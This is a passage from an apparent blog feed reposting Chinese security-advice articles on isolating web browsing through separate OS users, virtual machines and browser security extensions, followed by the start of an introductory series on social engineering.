这个优点跟“多浏览器”方案是类似的。俺就不再啰嗦了。</p><p><strong>3. 灵活性高</strong><br>　　与“多浏览器”的方案相比，“多实例”的方案明显灵活多了。因为 Firefox 和 Chrome 可以创建出任意多个实例（只要你的硬盘够大，想建几个实例都行）。而且，这个方案可以满足某些 Firefox 粉丝或 Chrome 粉丝的个人偏好。</p><h3 id="◇缺点-1"><a href="#◇缺点-1" class="headerlink" title="◇缺点"></a>◇缺点</h3><p><strong>1. 无法彻底解决浏览器漏洞的问题</strong><br>　　在这方面，“多实例方案”与“多浏览器方案”具有共同的缺陷——无法抵御具有【本地代码执行】的高危漏洞。包括浏览器漏洞和插件漏洞都有可能出现这类高危漏洞。<br>　　那么，该咋办捏，请看下一节——“多用户”的方案。</p><h2 id="★【多用户】的方案"><a href="#★【多用户】的方案" class="headerlink" title="★【多用户】的方案"></a>★【多用户】的方案</h2><p>　　前面提到的两种方案，都无法防范某些浏览器或插件的高危漏洞。因为这些高危漏洞会导致在本地执行攻击代码，并有可能植入木马。现在，俺来介绍第三种方案——多用户方案。此方案可以防范<strong>大部分</strong>在本地执行的攻击代码。<br>　　先说明一下，此处的“用户”指的是【操作系统用户】。</p><h3 id="◇某些高危漏洞为啥很危险？"><a href="#◇某些高危漏洞为啥很危险？" class="headerlink" title="◇某些高危漏洞为啥很危险？"></a>◇某些高危漏洞为啥很危险？</h3><p>　　俺前面反复提到“导致本地执行攻击代码的漏洞”。这样的漏洞是非常非常危险的。为啥捏？俺简单扫盲一下。<br>　　如果你的浏览器或者浏览器插件具有这类漏洞，当你访问某个恶意网页时，如果该恶意网页能够利用此漏洞，就可以在你的本地的操作系统中执行攻击代码。由于这个攻击代码是在浏览器的进程内触发的，所以该攻击代码就具有当前用户所具有的权限。<br>　　比方说，如今大部分网友都用 Windows 上网。并且，这些网友都是以“系统管理员”的身份使用浏览器。一旦碰到这类漏洞时，本地的攻击代码也同时具有了“系统管理员权限”。有了这么高的权限，攻击代码可以为所欲为。<br>　　某些网友可能会问：那不用管理员身份上网，是不是就没事了？<br>　　俺只能说，用低权限的用户身份（比如 Windows 里面的“Users 组”）上网，相对于用管理员身份上网，会好一些。但是捏，还是有问题。<br>　　举个例子：<br>　　即使你用低权限用户上网，一旦遭遇这类漏洞，攻击代码还是有可能植入木马。然后捏，这个木马有可能会查找你电脑上的各种私密文件（比如你的裸照）。然后木马会把这些私密文件发送给木马的主人。</p><p>　　从上述例子可见，用低权限的用户上网，【不能】彻底解决问题。所以，俺隆重推出第三种方案——多用户方案。</p><h3 id="◇啥是“多用户方案”捏？"><a href="#◇啥是“多用户方案”捏？" class="headerlink" title="◇啥是“多用户方案”捏？"></a>◇啥是“多用户方案”捏？</h3><p>　　如今的桌面操作系统，无论是 Windows 还是 Linux 或 Mac OS，都可以创建多个操作系统用户，并且这多个用户可以同时运行程序。如果你用过 WinXP 的快速用户切换，应该对此深有体会。<br>　　多用户方案的关键在于：<br>　　你需要创建一个或多个【低权限】的“上网用户”（所谓低权限，必须低于你当前使用的用户权限）。这些“上网用户”专门用来访问各种网站。<br>　　假使你不幸访问了恶意网页，遭遇本地执行的攻击代码，问题也不大。因为这些上网用户的权限很低，所以它们触发的攻击代码，权限也很低。因此攻击代码就比较难钻空子。一般来说，对“上网用户”的权限限制得越严格，攻击代码就越难有作为。</p><h3 id="◇操作步骤-2"><a href="#◇操作步骤-2" class="headerlink" title="◇操作步骤"></a>◇操作步骤</h3><p><strong>1. 创建上网用户</strong><br>　　如何在桌面系统中创建新的用户，大家应该都会吧？不会的同学，请看《避免使用高权限用户》一文的相关章节。上网用户可以只创建一个，也可以创建多个。具体建几个，看你的需求。<br>　　举例：<br>　　假如你非常看重网银的安全，可以创建两个上网用户，一个专门用来访问网银，一个专门用来上其它网站。<br>　　提醒一下：在这些上网用户的环境中，除了浏览器，其它啥软件都【别】装。</p><p><strong>2. 设置上网用户的权限</strong><br>　　再啰嗦一次，上网用户的权限，一定要低于你目前使用的用户权限。<br>　　以 Windows 为例：<br>在 Windows 中，常见的用户组的权限大小分别是：<strong>“Administrators 组” ＞ “Power Users 组” ＞ “Users 组” ＞ “Guest 组”</strong>。<br>如果你平时用“Administrators 组”的用户，那么可以把上网用户设置为：“Power User”或“User”或“Guest”<br>如果你平时用“Power Users 组”的用户，那么上网用户就只能设置为 User 或 Guest。<br>以此类推……<br>（如果你想了解这些用户组之间的权限差异，可以参考本系列的第一个帖子《避免使用高权限用户》）</p><p>　　提醒一下：<br>　　Guest 用户组的权限是最低，低得难以想象。所以，从安全角度而言，把上网用户设置为“Guest 组”是最安全滴。但是，也是最麻烦滴。你需要进行好多设置——否则的话，你可能连浏览器都跑不起来。<br>　　所以，除非你对 Windows 系统比较熟悉，否则的话，俺【不】建议使用“Guest 组”的权限。比较理想的权限是“Users 组”。这个组的权限也比较低，但是用起来不麻烦。</p><p><strong>3. 设置文件目录的访问控制权限（ACL）</strong><br>　　每个人的电脑中，都会有某几个目录是用来存放你的敏感个人资料的。<br>　　你必须设置这些目录的访问控制权限（简称 ACL），设置为：“上网用户”所在的组【<strong>不允许读写</strong>】。这样一来，你可以把自己那些敏感的，私密的文件（比如自己的裸照），都通过上述 ACL 保护起来。即使“上网用户”遭遇高危漏洞的攻击，本地执行的攻击代码也【难以拿到】你的隐私（俺说”难以拿到”，意思就是说，还是有可能滴，但是可能性很小，后面会解释）。<br>　　顺便提醒一下：对于 Windows 系统，只有使用 NTFS 格式的分区，才支持 ACL。FAT32 格式的分区是不支持滴！<br>　　如果你是个菜鸟，不懂得如何设置文件及目录的 ACL，没关系！Google 一下，你就知道。</p><p><strong>4. 多用户浏览器共享同一个桌面的技巧</strong><br>　　你可以直接用 Windows 提供的“快速用户切换”。对于 Windows 系统，从 WinXP 开始就提供了”快速用户切换”的功能。用它来切换用户还是很方便滴。但是这招有一个缺点：你一次只能看到某一个用户运行的软件，其它用户运行的软件看不到。<br>　　不过没关系，还有一个小技巧，可以让你在同一个桌面中，运行不同用户的软件（包括浏览器）。<br>　　假设你创建了 A ＆ B 两个用户。其中 A 是主用户，用来完成你日常的工作；B 是上网用户。那么你可以先登录“A用户”，然后在“A用户”的桌面上创建一个浏览器的快捷方式。（如何创建快捷方式，就不用俺手把手教了吧）<br>　　用鼠标选中该快捷方式，在快捷菜单（右键菜单）中，选择“属性”菜单项。出现如下对话框。</p><p><img src="https://lh4.googleusercontent.com/G7iCvdIjvzNzNLP-G0vIx1TUWoquHyB1250xkyEHN-yWMR1pDiCx_BBF8hPyXLCaRyp_3fuz0tXVVxNm5cb4dQpGezCDaS0_cl4LZV6wwGnw5icjZK81l3bmdmVv" alt="不见图 请翻墙"></p><p>在该对话框中，点“高级”按钮。出现如下对话框。把“以其他用户身份运行”选项打勾，就可以啦。</p><p><img src="https://lh3.googleusercontent.com/X47byUOJ2PtD7Smq9ArZdUFPjBjrCgrkY9lYSdWnTB7RIHUq1ByRDxtDL9v09Nk5eACHC4RzZDcV0RT9-adVQ77RxwGOqACe0YPpC_UgOEsSX4bp85kbWWlKwFJn" alt="不见图 请翻墙"></p><p>之后，如果你想在“A用户”的桌面上运行“B用户”的浏览器，只需点击该快捷方式，就会弹出如下对话框。然后输入“B用户”的用户名/口令，就能以“B用户”的身份运行浏览器。</p><p><img src="https://lh5.googleusercontent.com/vULI8x0WJ0XStJdYnN3G-t4Dj_Pr0YTzB-vyOVnANH04M2I6UXVOs49EJDwBS0Ba6Rq9pc0-JcekxJvrIrWh7mr2CzTGnVMr6LFAsQFlLf7w479G9PLEQWSW3-Ia" alt="不见图 请翻墙"></p><p>　　刚才介绍的是图形界面的配置。对于习惯于命令行的 IT 专业人员，还可以用命令行的方式启动指定用户的某个进程。Linux 系统和 Mac OS 系统有 <code>su</code> 或 <code>sudo</code> 命令；Windows 系统有 <code>runas</code> 命令。</p><h3 id="◇优点-2"><a href="#◇优点-2" class="headerlink" title="◇优点"></a>◇优点</h3><p><strong>1. 解决跨站脚本（XSS）的问题</strong><br>　　这个优点跟前两种方案类似，俺就不再啰嗦了。</p><p><strong>2. 解决高危插件（Flash）的使用问题</strong><br>　　这个优点跟前两种方案类似，俺就不再啰嗦了。</p><p><strong>3. 防范各种浏览器漏洞</strong><br>　　正如刚才提到的——前两种方案（多浏览器、多实例）无法防御浏览器及插件的某些高危漏洞（具备本地执行攻击代码的漏洞）。而“多用户方案”可以大大降低这类漏洞的危害性。使得攻击代码只能威胁到“上网用户”本身，而不会威胁到其它操作系统用户。</p><h3 id="◇缺点-2"><a href="#◇缺点-2" class="headerlink" title="◇缺点"></a>◇缺点</h3><p><strong>1. 初始配置稍嫌麻烦</strong><br>　　相比前面两种方案，这个方案的【初始配置】比较麻烦。而且你要分清楚哪个用户是用来干啥的。不过捏，一旦用久了，习惯了，也就不觉得麻烦了。</p><p><strong>2. 无法防范极个别高明的攻击者</strong><br>　　“多用户方案”之所以可以隔离攻击代码，是因为如今所有主流的桌面操作系统，都能够在操作系统层面，对不同的系统用户进行隔离。因为有操作系统层面的隔离，所以才限制了攻击代码的危害性。<br>　　但是，操作系统层面的隔离，也不是百分之百可靠滴。不要忘了，操作系统本身也是软件，也可能出现安全漏洞。在操作系统的安全漏洞中，有一类漏洞叫做“权限提升漏洞”（简称“提权漏洞”）。所谓的“提权漏洞”，顾名思义，就是能够提升【当前执行代码】的权限。比方说，本来攻击代码没有管理员权限，通过”提权漏洞”，就可以拿到管理员权限。<br>　　如果你的操作系统本身存在“提权漏洞”，同时你的浏览器或者插件存在“能够在本地执行代码的漏洞”，那么，高明的攻击者就有可能把这两者组合起来，对你的系统进行组合攻击。<br>　　不过大伙儿别担心——要实现这类组合攻击，需要同时掌握【未公开的】浏览器或插件漏洞，并且还要有【未公开的】操作系统提权漏洞（俺在前文里介绍过，“未公开漏洞”总是比“零日漏洞”更危险）。另外，攻击者还需要做很多准备工作，才能诱使你访问到恶意网页。一般的入侵者根本没有这个本事，也没有耐心去搞这些。反之，有这个本事又有这个耐心的入侵者，通常不会拿这种招数去入侵普通网友（这么做简直是大材小用）。所以，如果你只是一个普通的网友，在前面三个方案中挑选一个，即可。</p><p>　　估计有些好奇的同学会打听了。什么样的入侵者具有这种实力？什么样的人会成为他们的目标？<br>　　由于本文的篇幅已经很长了，俺稍微调一下列位看官的胃口，在《Web相关的防范（下）》再来八卦这些，同时也介绍一下比“多用户方案”更高级的方案。虽然这种方案很多人用不到，但俺还是会写出来，就当满足一下大伙儿的好奇心 :-)</p><h1 id="如何防止黑客入侵-7-：Web相关的防范（下）"><a href="#如何防止黑客入侵-7-：Web相关的防范（下）" class="headerlink" title="如何防止黑客入侵[7]：Web相关的防范（下）"></a>如何防止黑客入侵[7]：Web相关的防范（下）</h1><p><strong>文章目录</strong></p><p>★【多虚拟机】的方案<br>★使用浏览器的【安全扩展】<br>★结尾</p><p>　　在前文，俺介绍了三种隔离浏览器的方式（多种浏览器、同种浏览器多实例、多操作系统用户）。今天继续介绍第四种隔离方式——虚拟机，然后再推荐一些浏览器的安全扩展。</p><h2 id="★【多虚拟机】的方案"><a href="#★【多虚拟机】的方案" class="headerlink" title="★【多虚拟机】的方案"></a>★【多虚拟机】的方案</h2><h3 id="◇什么是“虚拟机”？"><a href="#◇什么是“虚拟机”？" class="headerlink" title="◇什么是“虚拟机”？"></a>◇什么是“虚拟机”？</h3><p>　　本文提到的“虚拟机”，全称是“操作系统虚拟机”。<br>　　最近10年来，硬件水平显著提升，操作系统虚拟化的技术开始普及，出现了若干针对操作系统的虚拟化软件。这种软件可以让你在一台电脑上，同时运行【<strong>多个操作系统</strong>】（是不是很有趣？）。通过虚拟化软件来运行的操作系统，称之为“虚拟操作系统”；与之对应，你原先的操作系统称之为：真实操作系统或宿主操作系统。<br>　　由于“虚拟操作系统”是虚拟出来滴，你可以在里面为所欲为，而【不会】对真实操作系统产生实质性的影响。比方说，你可以在虚拟系统中把硬盘格式化，但不会影响到你的真实系统。同样的，如果某个虚拟系统被病毒感染了，也不会影响真实系统和其它虚拟系统。</p><h3 id="◇什么是“多虚拟机”的方案？"><a href="#◇什么是“多虚拟机”的方案？" class="headerlink" title="◇什么是“多虚拟机”的方案？"></a>◇什么是“多虚拟机”的方案？</h3><p>　　所谓“多虚拟机”的方案，就是在你的电脑上创建多个虚拟机，分别用来实现【不同安全级别】的上网行为。<br>　　举个例子：<br>　　你可以创建虚拟机A，只用来访问网银（不访问其它网站）；然后创建虚拟机B，用来进行其它上网行为。那么，即使你在虚拟机B受到攻击，对虚拟机A也完全没有影响。这样一来，就可以彻底保证网银的安全。</p><h3 id="◇为啥要用“多虚拟机”的方案？"><a href="#◇为啥要用“多虚拟机”的方案？" class="headerlink" title="◇为啥要用“多虚拟机”的方案？"></a>◇为啥要用“多虚拟机”的方案？</h3><p>前一篇博文提到的三种隔离方案，“多用户”比前两种方案安全。这种方案是基于操作系统提供的用户壁垒——包括：不同用户的进程隔离性、文件系统的访问控制（ACL）、等等。<br>　　但是“多用户”方案还是有缺陷的。如果攻击者同时利用了未公开的浏览器漏洞和未公开的操作系统【提权】漏洞，就有可能攻破操作系统的用户壁垒。不过大伙儿别担心，实现这种攻击的难度比较大，只有足够牛B的入侵者能够做到这点。<br>　　为了满足列位看官的好奇心，稍微介绍一下所谓的牛逼黑客，大都是哪些人。</p><p><strong>御用骇客/御用高手</strong><br>　　所谓的“御用高手/御用骇客”，也就是官方资助的入侵者（类似于武侠小说中的大内高手）。这种类型的入侵者，往往不是一个人单干独斗，而是一个团队群殴。<br>　　“御用高手”的目标大致有如下：<br>　　1. 军事目标<br>军事目标主要有：外国重要的政府机构（比如：五角大楼）、外国重要的军工企业（比如：洛克希德-马丁公司）<br>俺在前文提到了 RSA 被入侵的案例：攻击者首先利用零日漏洞入侵某个 RSA 公司的雇员，经过深度渗透之后，入侵者搞到了 RSA 动态令牌产品（SecureID）的种子（种子是用来生成动态口令的）。由于 SecureID 产品被许多大公司采用，所以入侵者可以利用偷来的种子算出动态口令，进而实现对美国多家大型军工企业的入侵。<br>计划得如此严密的系列入侵，通常只有御用黑客团队能够干得出来。<br>　　2. 经济目标<br>所谓的经济目标，主要都是国外知名的大公司。<br>通过入侵这些公司，可以窃取商业机密，从而获得巨大的经济效益。<br>　　3. 政治目标<br>政治目标就比较杂，比如：知名的反共网站、某些知名的政治异议人士的电脑/手机/邮箱/IM、等等。<br>　　举个例子：<br>　　2009年底，Google 被来自中国大陆的攻击者深度渗透（这就是传说中的“<a href="https://zh.wikipedia.org/wiki/%E6%9E%81%E5%85%89%E8%A1%8C%E5%8A%A8">极光行动</a>”）。此事直接导致 Google 愤而退出中国市场。根据事后分析，入侵者的注意力集中在某些 Gmail 邮箱的内容。而这些 Gmail 邮箱恰恰属于中国的持不同政见者。由此可见，入侵 Google 的人很可能是朝廷的走狗。</p><p><strong>民间高手</strong><br>　　除了御用黑客，也不排除民间有高手。甚至不排除某个御用黑客在业余时间干点脏活。<br>　　和御用高手不同，民间高手的目标相对比较单一，大部分人是为了获取经济利益。</p><p>　　综上所述，能被这2类人盯上的，往往是高价值目标。如果你只是一个普通网民，不用担心被高手盯上（也就是说，“多用户”的方案基本上可以满足你的安全需求）；反之，如果你自认为是一个高价值的目标，或者你对安全的要求非常非常高，不妨尝试一下“多虚拟机”的方案。</p><h3 id="◇如何操作？"><a href="#◇如何操作？" class="headerlink" title="◇如何操作？"></a>◇如何操作？</h3><p>　　刚才已经说了“多虚拟机”的原理，还举了例子。<br>　　如果你已熟悉“虚拟化软件”（比如：VMware 系列、VirtualBox、等）的使用，那么本方案对你来说其实很简单——无非就是安装若干个虚拟操作系统，然后在虚拟系统中安装软件，仅此而已。<br>　　由于本文的重点是防范黑客入侵，所以俺就不再介绍虚拟化软件本身的安装和配置。<strong>关于虚拟化软件的扫盲（包括原理、安装、配置、使用），俺已经另写了一个系列（在“<a href="https://program-think.blogspot.com/2012/10/system-vm-0.html">这里</a>”）</strong>。</p><h3 id="◇优点-3"><a href="#◇优点-3" class="headerlink" title="◇优点"></a>◇优点</h3><p>　　在4种浏览器隔离方案中，多虚拟机的安全性最高。即使你的某个虚拟机被病毒感染或者被植入木马，也几乎不会影响到你的其它虚拟机和真实系统。<br>　　当然，绝对的安全是不存在滴。虚拟化软件也是软件，只要是软件，就有可能出现漏洞，只要出现漏洞，就有可能被利用。但是，想通过虚拟化软件的漏洞来突破虚拟机的壁垒，难度更大（远远大于突破操作系统的用户壁垒）。这方面的技术细节，说来话长，俺就不展开了。</p><h3 id="◇缺点-3"><a href="#◇缺点-3" class="headerlink" title="◇缺点"></a>◇缺点</h3><p>　　对硬件的要求高（主要是物理内存和 CPU）。<br>　　具体要多高的硬件配置，取决于你<strong>同时</strong>开几个虚拟机。<strong>同时运行</strong>的虚拟机越多，就需要越大的物理内存和越多的CPU核心。</p><h2 id="★使用浏览器的【安全扩展】"><a href="#★使用浏览器的【安全扩展】" class="headerlink" title="★使用浏览器的【安全扩展】"></a>★使用浏览器的【安全扩展】</h2><p>　　终于把浏览器的话题说完了。接下来再介绍几款安全方面的浏览器扩展。这些扩展可以帮你提高 Web 的安全性。</p><h3 id="◇NoScript——同时支持-Firefox-＆-Chrome"><a href="#◇NoScript——同时支持-Firefox-＆-Chrome" class="headerlink" title="◇NoScript——同时支持 Firefox ＆ Chrome"></a>◇NoScript——同时支持 Firefox ＆ Chrome</h3><p><strong>简介</strong><br>　　NoScript 是一个名气很大、功能很强的 Firefox 扩展，主页在“<a href="https://addons.mozilla.org/en-US/firefox/addon/noscript/">这里</a>”。<br>通过它，你可以定制网站白名单。只有当你浏览白名单内的网站时，才启用浏览器的 JavaScript 脚本功能和插件功能（比如 Flash 插件、Java 插件、PDF 插件、等）。<br>　　白名单只是它的功能之一，更多的功能介绍，请看它的主页。</p><p><strong>局限性</strong><br>　　这个扩展可以有效地避免【陌生网站】上的挂马。但是，如果你【经常访问】的网站出现跨站脚本的漏洞，NoScript 有可能帮不了你。<br>　　在<a href="https://program-think.blogspot.com/2012/08/howto-prevent-hacker-attack-5.html">前面的博文</a>中，俺曾经举了一个跨站脚本攻击的例子。比如说，你经常上某个 BBS，并且该 BBS 的界面功能依赖于 JavaScript。那么，你就必须把这个 BBS 站点加入到 NoScript 的白名单中。假如这个 BBS 本身出现了基于 JS 的跨站脚本漏洞，那你还是有可能中招 :(</p><h3 id="◇NotScripts-与-ScriptNo——专用于-Chrome"><a href="#◇NotScripts-与-ScriptNo——专用于-Chrome" class="headerlink" title="◇NotScripts 与 ScriptNo——专用于 Chrome"></a>◇NotScripts 与 ScriptNo——专用于 Chrome</h3><p><strong>简介</strong><br>　　某些用 Chrome 的同学，如果不喜欢刚才提到的 NoScript，可以考虑 Chrome 上的另外两款扩展——跟 NoScript 很像（不但功能很像，连名称也很像）。<br>　　一款叫做 NotScripts，主页在“<a href="https://chrome.google.com/webstore/detail/odjhifogjcknibkahlpidmdajjpkkcfn">这里</a>”；另一款叫 ScriptNo，主页在“<a href="https://chrome.google.com/webstore/detail/oiigbmnaadbkfbmpbfijlflahbdbdgdf">这里</a>”。<br>　　NotScripts 的用户数比 ScriptNo 略多。至于要选哪个，请大伙儿自行判断。</p><p><strong>局限性</strong><br>　　这两款扩展的局限性类似于前一个小节提到的 NoScript，俺就不再啰嗦了。</p><h3 id="◇HTTPS-Everywhere"><a href="#◇HTTPS-Everywhere" class="headerlink" title="◇HTTPS Everywhere"></a>◇HTTPS Everywhere</h3><p>　　这是著名的电子前线组织（EFF）发布的扩展，主页在“<a href="https://www.eff.org/https-everywhere">这里</a>”，同时支持 Firefox 和 Chrome。说到 EFF，顺便提一下：Tor ＆ TorBrowser 也是该组织发布的产品。<br>　　如今，有很多网站都同时提供明文的 HTTP 协议和加密的 HTTPS 协议（比如维基百科）。装了 HTTPS Everywhere 扩展之后，如果你浏览的网站支持 HTTPS 协议，该扩展就会强制浏览器通过 HTTPS 协议访问该网站。从技术上讲，就是把所有针对该网站的 HTTP 请求都转换为 HTTPS 请求。<br>　　为啥要强制用 HTTPS 协议捏？因为 HTTPS 是加密协议，可以保护你免受入侵者的嗅探（关于“嗅探”的案例，前面的博文提到过）。<br>　　除了上述功能，HTTPS Everywhere 扩展还可以帮你侦测有问题的 CA 证书，降低“<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击</a>”（MITM）的风险。</p><p><strong>局限性</strong><br>　　如果某个网站只有 HTTP 连接，不提供 HTTPS 连接，那 HTTPS Everywhere 也帮不了你。</p><h3 id="◇LastPass"><a href="#◇LastPass" class="headerlink" title="◇LastPass"></a>◇LastPass</h3><p><strong>简介</strong><br>　　LastPass 名气最大的在线口令管理工具。官网在“<a href="https://www.lastpass.com/">这里</a>”，维基百科的介绍在“<a href="https://zh.wikipedia.org/wiki/LastPass">这里</a>”。<br>　　该工具提供了针对所有主流浏览器的扩展（包括IE、Firefox、Chrome、Opera、Safari、等），帮你自动填写网站的登录口令，免除你记忆诸多口令的麻烦。你本人只需要记住一个【主密码】，LastPass 会利用主密码来加密本地的密码数据库——你的其它口令都存在在该数据库中。<br>　　为了确保安全性，LastPass 进行在线同步时，传输的是加密后的数据库。因此，即使 LastPass 网站被黑，入侵者拿到的也只是加密后的用户口令数据库。同样的，如果有人偷了你的电脑，但不知道你的主密码，也无法打开你的密码数据库。</p><p><strong>局限性</strong><br>　　LastPass 的做法相当于把鸡蛋都放在一个篮子里，有好处也有坏处。<br>　　最大的风险在于主密码被盗。一旦主密码被盗，密码数据库中的所有密码就都暴露了。什么情况下会发生主密码被盗捏？比如你的电脑被植入木马，并且此木马具有键盘记录的功能；比如你输入主密码的时候，有人在旁边偷窥；……<br>　　每个人都有很多密码。不过根据二八原理，真正重要的密码不到20%，大部分密码都不太重要。所以俺个人的建议是：少数特别重要的密码，还是靠自己脑子来记；大多数不太重要的密码，可以交给类似 LastPass 之类的口令管理软件。</p><h3 id="◇BetterPrivacy"><a href="#◇BetterPrivacy" class="headerlink" title="◇BetterPrivacy"></a>◇BetterPrivacy</h3><p><strong>简介</strong><br>　　BetterPrivacy 是一个侧重于隐私保护的 Firefox 扩展，主页在“<a href="https://addons.mozilla.org/en-US/firefox/addon/betterprivacy/">这里</a>”。<br>　　当你浏览某些网站的时候，网站可能会在你的电脑上记录 cookie。通过这些 cookie，网站可以追踪你的上网行为（比如你多久访问一次这个网站）。<br>　　有了 BetterPrivacy，你就可以配置允许哪些网站记录 cookie。BetterPrivacy 的牛B之处在于：它不光可以控制传统的 cookie，还可以控制 Flash 的 cookie（LSO）。</p><p><strong>局限性</strong><br>　　此扩展只针对隐私保护，无法防范扩展脚本等攻击。</p><p>　　浏览器的安全类扩展，细分为很多领域，数量也很多。限于篇幅，俺仅挑选出每个领域最出名的代表。如果你还有补充的，可以到<a href="https://program-think.blogspot.com/2012/10/howto-prevent-hacker-attack-7.html">本文留言</a>。</p><h2 id="★结尾-2"><a href="#★结尾-2" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　关于 Web 的安全防范，本来只想写一篇。谁曾想，东扯西扯，居然写了三篇。可能有同学会问，为啥没提到杀毒软件和个人防火墙？俺觉得：把这两个话题放到 Web 安全防范中聊，不太合适——还是单独拿出来聊比较好。在本系列后续的博文，会说说杀毒软件和个人防火墙的那些事儿。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学</title>
      <link href="/2021/07/17/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
      <url>/2021/07/17/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="扫盲“社会工程学”-0-：基本常识"><a href="#扫盲“社会工程学”-0-：基本常识" class="headerlink" title="扫盲“社会工程学”[0]：基本常识"></a>扫盲“社会工程学”[0]：基本常识</h1><p><strong>文章目录</strong></p><p>★社会工程学是啥玩意儿？<br>★为啥要了解社会工程学？<br>★本系列帖子能给你啥帮助？<br>★本系列帖子不能给你哪些帮助？</p><p>　　最近几年，信息安全方面的问题日益严重，许多同学深受其害（比如网络钓鱼、盗用银行卡、蠕虫木马泛滥、僵尸网络盛行等等）。俺窃以为，很大一部分原因在于相应的扫盲教育没有跟上。且不说普通的电脑菜鸟对信息安全一无所知，即便是很多 IT 公司的专业技术人员，对此也知之甚少。其后果就是：很多菜鸟级的攻击手法屡试不爽，很多平庸的攻击者屡屡得手。有鉴于此，俺打算抽空普及一下信息安全相关的东东，或许能对某些同学有所帮助。<br>　　其实信息安全方面的话题非常之多，俺经过左思右想之后，决定先拿社会工程学来扫盲一下。至于为啥先说它，后面会解释原因。</p><h2 id="★社会工程学是啥玩意儿？"><a href="#★社会工程学是啥玩意儿？" class="headerlink" title="★社会工程学是啥玩意儿？"></a>★社会工程学是啥玩意儿？</h2><p>　　俺喜欢把信息安全分为【硬安全】和【软安全】两部分。所谓“硬安全”主要包括具体的 IT 安全技术（比如：防火墙、入侵检测、漏洞扫描、拒绝服务攻击、缓冲区溢出攻击 ……）；而“软安全”主要涉及管理、心理学、文化、人际交往等方面，与具体的 IT 技术无关。今天所说的社会工程学，实际上就是“软安全”的范畴。<br>　　通俗地说，社会工程就是：攻击者利用【<strong>人</strong>】自身的弱点（往往是心理学层面）来获取信息、影响他人，从而达到自己不可告人的目的。光这么说稍显简单，更详细的定义可以参见“<a href="https://en.wikipedia.org/wiki/Social_engineering_(security)">这里</a>”。不懂洋文的同学可以看“<a href="https://zh.wikipedia.org/wiki/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6">这里</a>”。</p><h2 id="★为啥要了解社会工程学？"><a href="#★为啥要了解社会工程学？" class="headerlink" title="★为啥要了解社会工程学？"></a>★为啥要了解社会工程学？</h2><p>　　开头已经提到了安全基础知识的普及度不够。那为啥俺要先介绍社会工程学捏？主要有如下几点原因：</p><h3 id="◇普及度不够"><a href="#◇普及度不够" class="headerlink" title="◇普及度不够"></a>◇普及度不够</h3><p>　　首先，社会工程是信息安全中一个经常被忽视的偏僻角落。即便很多 IT 安全领域的从业人员，往往也缺少社会工程学的相关常识。比如很多人都知道什么是防火墙、杀毒软件，但却从来没有听说过“社会工程学”这个词。</p><h3 id="◇重视不够"><a href="#◇重视不够" class="headerlink" title="◇重视不够"></a>◇重视不够</h3><p>　　大部分的安全厂商都把注意力集中在“硬安全”方面（比如现在防火墙厂商、杀毒厂商多如牛毛），很少有安全厂商把社会工程挂在嘴边的。以此<strong>相反</strong>的是：现有的信息安全攻击，大都以“软安全”作为攻击者的突破口，只有一小部分是纯粹通过“硬安全”来进行的。（这又是一个二八原理的生动例子）<br>　　为啥攻击者喜欢从“软安全”层面进行突破捏？因为人性的弱点是很难在短时间内得到改善的（尤其是人多大公司、大机构，更是如此）。所以，“软安全”方面会遗留很多可以利用的漏洞，攻击者只要善于利用这些漏洞，就可以轻易侵入。</p><h3 id="◇用处大大滴"><a href="#◇用处大大滴" class="headerlink" title="◇用处大大滴"></a>◇用处大大滴</h3><p>　　不过捏，光是鲜为人知、重视不足，还不至于让俺花这么多口水大力忽悠。还有另一个原因是：社会工程学的常识非常有用，而且它的用处不限于信息产业（几乎所有行业都用得着）。具体有些啥用处捏？<br>　　首先，了解起码的社会工程学常识能够让你对相关的攻击手法（具体参见“<a href="https://program-think.blogspot.com/2009/05/social-engineering-1-gather-information.html">这里</a>”和“<a href="https://program-think.blogspot.com/2009/05/social-engineering-2-pretend.html">这里</a>”）有<strong>基本的</strong>防范，不至于轻易上当。要知道，有很多人被攻击者利用了之后，自己还浑然不觉。<br>　　其次，如果你是公司的老板或者某个管理层的头头，你可以在自己的职权范围内进行相关的扫盲培训（后面的帖子会介绍如何防范）。<br>　　最后，假如你看完本系列后，发现自己在社会工程方面很有天赋，那或许可以考虑朝这个方向发展。比如搞个商业间谍之类的工作干干，没准也很有前途哦。不过捏，一旦将来被抓被关、被杀被剐，本博主是概不负责滴 <strong>:-)</strong></p><h2 id="★本系列帖子能给你啥帮助？"><a href="#★本系列帖子能给你啥帮助？" class="headerlink" title="★本系列帖子能给你啥帮助？"></a>★本系列帖子能给你啥帮助？</h2><p>　　如果你从来没有听说过社会工程学，仅仅想扫盲，那只需看本帖即可，后续的内容无需多看。<br>　　如果你希望对社会工程攻击能够有<strong>基本的</strong>防范，建议看看后续的“攻击手法”、“如何防范”。<br>　　如果你对社会工程学这门学问很有兴趣，建议看完本系列所有帖子。<br>　　如果你已经是社会工程学的老手，请不吝赐教，本系列帖子您老就不用看了。</p><h2 id="★本系列帖子不能给你哪些帮助？"><a href="#★本系列帖子不能给你哪些帮助？" class="headerlink" title="★本系列帖子不能给你哪些帮助？"></a>★本系列帖子不能给你哪些帮助？</h2><p>　　本系列帖子【<strong>不能</strong>】帮你成为社会工程学的高手。如果你真想达到这个目标，请先【<strong>确保</strong>】自己有这方面的天赋，接着再通过《<a href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》（<a href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著）进行深造。<br>　　本系列帖子【不能】帮你化解【所有的】社会工程攻击。毕竟社会工程学的手法太多、涉及的面太广。有些新颖的手法，其设计之巧妙、用心之险恶，估计连俺都会入套。</p><h1 id="扫盲“社会工程学”-1-：攻击手法之【信息收集】"><a href="#扫盲“社会工程学”-1-：攻击手法之【信息收集】" class="headerlink" 